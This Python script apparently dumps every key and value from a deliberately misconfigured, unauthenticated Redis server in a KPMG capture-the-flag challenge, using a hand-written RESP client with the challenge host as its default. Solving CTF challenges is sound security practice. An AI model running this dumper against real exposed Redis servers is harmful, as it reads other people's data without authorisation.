#!/usr/bin/env python3
"""
Redis (RESP) key dumper used for the "Vodoo Spirit of Death - 1" KPMG CTF challenge.

The challenge exposes a deliberately misconfigured in-memory key-value store
(Redis 5.0.7) on a public TCP port.  This script connects with a tiny RESP
client (no redis-py needed), enumerates every key and prints its type + value.

Usage:
    python3 redis_dump.py <host> <port>
"""
import socket
import sys


def read_line(sock):
    buf = b""
    while not buf.endswith(b"\r\n"):
        c = sock.recv(1)
        if not c:
            break
        buf += c
    return buf[:-2]


def read_reply(sock):
    line = read_line(sock)
    if not line:
        return None
    t = line[:1]
    if t == b"+":
        return line[1:].decode(errors="replace")
    if t == b"-":
        return "ERR:" + line[1:].decode(errors="replace")
    if t == b":":
        return int(line[1:])
    if t == b"$":
        n = int(line[1:])
        if n == -1:
            return None
        data = b""
        while len(data) < n + 2:
            data += sock.recv(n + 2 - len(data))
        return data[:n]
    if t == b"*":
        n = int(line[1:])
        if n == -1:
            return None
        return [read_reply(sock) for _ in range(n)]
    return line


def cmd(sock, *args):
    out = b"*%d\r\n" % len(args)
    for a in args:
        if isinstance(a, str):
            a = a.encode()
        out += b"$%d\r\n%s\r\n" % (len(a), a)
    sock.sendall(out)
    return read_reply(sock)


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "0.cloud.chals.io"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 10507
    s = socket.create_connection((host, port), timeout=10)
    keys = sorted(k.decode() for k in cmd(s, "KEYS", "*"))
    print("TOTAL %d keys" % len(keys))
    for k in keys:
        t = cmd(s, "TYPE", k)
        v = cmd(s, "GET", k)
        if isinstance(v, bytes):
            v = v.decode(errors="replace")
        print("=== %s [%s]" % (k, t))
        print(v)
        print()


if __name__ == "__main__":
    main()
